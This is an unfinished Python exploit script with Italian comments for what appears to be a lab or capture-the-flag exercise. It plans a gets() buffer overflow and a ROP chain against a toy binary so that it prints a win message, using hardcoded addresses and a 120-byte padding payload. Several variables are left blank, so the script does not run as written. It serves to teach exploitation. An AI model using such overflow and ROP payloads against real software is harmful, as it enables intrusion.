#note: e` l'exploit 2

import os
import struct

#bisognava stampare "congratulations you win" andando a sfruttare la gets dentro read_file: e poi chiamare la funzione join_string mettendo str2 in str1 e poi chiamando lazy che stampa
#bisogna chiamare read_file tramite la gets in echo() poi dentro read_file devo riuscire a passare l'if (quindi bisogna mettere flag a 1 e mettere magicword al valore richiesto) e nel secondo overflow devo chiamare join_string
#si usa il primo exploit ?

#quindi: echo() deve chiamare read_file() poi read_file() entra nell'if, fa overflow che e` un rop che permette di chiamare join_string() e lazy()

flag = 0x0804a064 #da info variables

#bisogna passare tra funzioni: servono gli indirizzi -> chiamare read_file, join_string e laxy
read_file = 0x80485b2
join_string = 0x80484cb
lazy = 0x804858d

ret =
pop_pop_ret =
str1 =
str2 = 

#prima fase di attacco:
payload = "A"*120 #siamo dentro read_file, prendiamo buffer1 e andiamo a sovrascrivere fino a subito prima di p
payload += struct.pack("I", flag) #dobbiamo entrare nell'indirizzo di flag



